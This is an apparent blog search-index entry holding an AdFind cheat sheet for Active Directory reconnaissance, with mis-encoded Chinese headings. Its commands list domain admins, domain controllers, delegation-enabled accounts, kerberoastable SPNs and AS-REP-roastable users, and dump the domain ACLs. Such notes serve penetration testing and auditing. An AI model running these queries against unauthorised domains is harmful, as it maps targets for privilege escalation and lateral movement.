        <content type="html"><![CDATA[<h1 id="ä¸‹è½½åœ°å€"><a href="#ä¸‹è½½åœ°å€" class="headerlink" title="ä¸‹è½½åœ°å€"></a>ä¸‹è½½åœ°å€</h1><p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><h1 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h1><h2 id="æŸ¥æ‰¾å—-AD-ä¿æŠ¤çš„åŸŸä¸­çš„æ‰€æœ‰ç”¨æˆ·"><a href="#æŸ¥æ‰¾å—-AD-ä¿æŠ¤çš„åŸŸä¸­çš„æ‰€æœ‰ç”¨æˆ·" class="headerlink" title="æŸ¥æ‰¾å— AD ä¿æŠ¤çš„åŸŸä¸­çš„æ‰€æœ‰ç”¨æˆ·"></a>æŸ¥æ‰¾å— AD ä¿æŠ¤çš„åŸŸä¸­çš„æ‰€æœ‰ç”¨æˆ·</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>domain,DC<span class="token operator">=</span>com -f <span class="token string">"&amp;(objectcategory=person)(samaccountname=*)(admincount=1)"</span> -dn</code></pre><h2 id="æŸ¥æ‰¾åŸŸä¸­å—-AD-ä¿æŠ¤çš„æ‰€æœ‰ç»„"><a href="#æŸ¥æ‰¾åŸŸä¸­å—-AD-ä¿æŠ¤çš„æ‰€æœ‰ç»„" class="headerlink" title="æŸ¥æ‰¾åŸŸä¸­å— AD ä¿æŠ¤çš„æ‰€æœ‰ç»„"></a>æŸ¥æ‰¾åŸŸä¸­å— AD ä¿æŠ¤çš„æ‰€æœ‰ç»„</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>domain,DC<span class="token operator">=</span>com -f <span class="token string">"&amp;(objectcategory=group)(admincount=1)"</span> -dn</code></pre><h2 id="æŸ¥çœ‹åŸŸç®¡è´¦æˆ·"><a href="#æŸ¥çœ‹åŸŸç®¡è´¦æˆ·" class="headerlink" title="æŸ¥çœ‹åŸŸç®¡è´¦æˆ·"></a>æŸ¥çœ‹åŸŸç®¡è´¦æˆ·</h2><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind -default -f <span class="token string">"(&amp;(|(&amp;(objectCategory=person)(objectClass=user))(objectCategory=group))(adminCount=1))"</span> -dn</code></pre><h2 id="åˆ—å‡ºåŸŸæ§åˆ¶å™¨åç§°"><a href="#åˆ—å‡ºåŸŸæ§åˆ¶å™¨åç§°" class="headerlink" title="åˆ—å‡ºåŸŸæ§åˆ¶å™¨åç§°"></a>åˆ—å‡ºåŸŸæ§åˆ¶å™¨åç§°</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc dclist</code></pre><h2 id="æŸ¥çœ‹åŸŸæ§ç‰ˆæœ¬"><a href="#æŸ¥çœ‹åŸŸæ§ç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹åŸŸæ§ç‰ˆæœ¬"></a>æŸ¥çœ‹åŸŸæ§ç‰ˆæœ¬</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -schema -s base objectversion</code></pre><h2 id="æŸ¥çœ‹åŸŸå†…åœ¨çº¿çš„è®¡ç®—æœº"><a href="#æŸ¥çœ‹åŸŸå†…åœ¨çº¿çš„è®¡ç®—æœº" class="headerlink" title="æŸ¥çœ‹åŸŸå†…åœ¨çº¿çš„è®¡ç®—æœº"></a>æŸ¥çœ‹åŸŸå†…åœ¨çº¿çš„è®¡ç®—æœº</h2><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -sc computers_active name operatingSystem</code></pre><h2 id="æŸ¥çœ‹åŸŸå†…-GPO-ä¿¡æ¯"><a href="#æŸ¥çœ‹åŸŸå†…-GPO-ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹åŸŸå†… GPO ä¿¡æ¯"></a>æŸ¥çœ‹åŸŸå†… GPO ä¿¡æ¯</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc gpodmp</code></pre><h2 id="éçº¦æŸå§”æ´¾"><a href="#éçº¦æŸå§”æ´¾" class="headerlink" title="éçº¦æŸå§”æ´¾"></a>éçº¦æŸå§”æ´¾</h2><h3 id="æŸ¥è¯¢ç”¨æˆ·"><a href="#æŸ¥è¯¢ç”¨æˆ·" class="headerlink" title="æŸ¥è¯¢ç”¨æˆ·"></a>æŸ¥è¯¢ç”¨æˆ·</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre><h3 id="æŸ¥è¯¢ä¸»æœº"><a href="#æŸ¥è¯¢ä¸»æœº" class="headerlink" title="æŸ¥è¯¢ä¸»æœº"></a>æŸ¥è¯¢ä¸»æœº</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre><h2 id="çº¦æŸå§”æ´¾"><a href="#çº¦æŸå§”æ´¾" class="headerlink" title="çº¦æŸå§”æ´¾"></a>çº¦æŸå§”æ´¾</h2><h3 id="æŸ¥è¯¢ç”¨æˆ·-1"><a href="#æŸ¥è¯¢ç”¨æˆ·-1" class="headerlink" title="æŸ¥è¯¢ç”¨æˆ·"></a>æŸ¥è¯¢ç”¨æˆ·</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</code></pre><h3 id="æŸ¥è¯¢ä¸»æœº-1"><a href="#æŸ¥è¯¢ä¸»æœº-1" class="headerlink" title="æŸ¥è¯¢ä¸»æœº"></a>æŸ¥è¯¢ä¸»æœº</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</code></pre><h2 id="æŸ¥çœ‹åŸŸå†…é«˜æƒé™çš„-SPN-æœåŠ¡ä¸»ä½“åç§°"><a href="#æŸ¥çœ‹åŸŸå†…é«˜æƒé™çš„-SPN-æœåŠ¡ä¸»ä½“åç§°" class="headerlink" title="æŸ¥çœ‹åŸŸå†…é«˜æƒé™çš„ SPN æœåŠ¡ä¸»ä½“åç§°"></a>æŸ¥çœ‹åŸŸå†…é«˜æƒé™çš„ SPN æœåŠ¡ä¸»ä½“åç§°</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token string">"dc=merak,dc=local"</span> -f <span class="token string">"&amp;(servicePrincipalName=*)(admincount=1)"</span> servicePrincipalName</code></pre><h2 id="æŸ¥çœ‹å¯-AS-REP-Roasting-ç”¨æˆ·"><a href="#æŸ¥çœ‹å¯-AS-REP-Roasting-ç”¨æˆ·" class="headerlink" title="æŸ¥çœ‹å¯ AS-REP Roasting ç”¨æˆ·"></a>æŸ¥çœ‹å¯ AS-REP Roasting ç”¨æˆ·</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token string">"dc=merak,dc=local"</span> -f <span class="token string">"useraccountcontrol:1.2.840.113556.1.4.803:=4194304"</span> -dn</code></pre><h2 id="å¯¼å‡ºæ•´ä¸ªåŸŸçš„-ACL"><a href="#å¯¼å‡ºæ•´ä¸ªåŸŸçš„-ACL" class="headerlink" title="å¯¼å‡ºæ•´ä¸ªåŸŸçš„ ACL"></a>å¯¼å‡ºæ•´ä¸ªåŸŸçš„ ACL</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc getacls -sddlfilter <span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span> -recmute</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
